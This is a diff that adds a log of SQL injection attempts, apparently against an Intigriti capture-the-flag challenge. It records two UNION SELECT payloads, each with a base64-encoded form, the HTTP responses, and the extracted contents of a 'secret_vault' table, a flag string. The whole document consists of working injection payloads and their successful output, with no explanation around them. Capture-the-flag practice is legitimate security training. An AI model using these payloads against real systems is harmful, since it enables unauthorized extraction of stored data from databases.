@@ -1,0 +1,10 @@
+RAW  : "' UNION SELECT note FROM secret_vault-- -"
+B64  : JyBVTklPTiBTRUxFQ1Qgbm90ZSBGUk9NIHNlY3JldF92YXVsdC0tIC0=
+HTTP : 200 LEN=4095
+DET  : art='🖼️' h2='&#039; UNION SELECT note FROM secret_vault-- -' desc='INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}<br>'
+------------------------------------------------------------------------
+RAW  : "' UNION SELECT GROUP_CONCAT(id,':',note) FROM secret_vault-- -"
+B64  : JyBVTklPTiBTRUxFQ1QgR1JPVVBfQ09OQ0FUKGlkLCc6Jyxub3RlKSBGUk9NIHNlY3JldF92YXVsdC0tIC0=
+HTTP : 200 LEN=4128
+DET  : art='🖼️' h2='&#039; UNION SELECT GROUP_CONCAT(id,&#039;:&#039;,note) FROM secret_vault-- -' desc='1:INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}<br>'
+------------------------------------------------------------------------
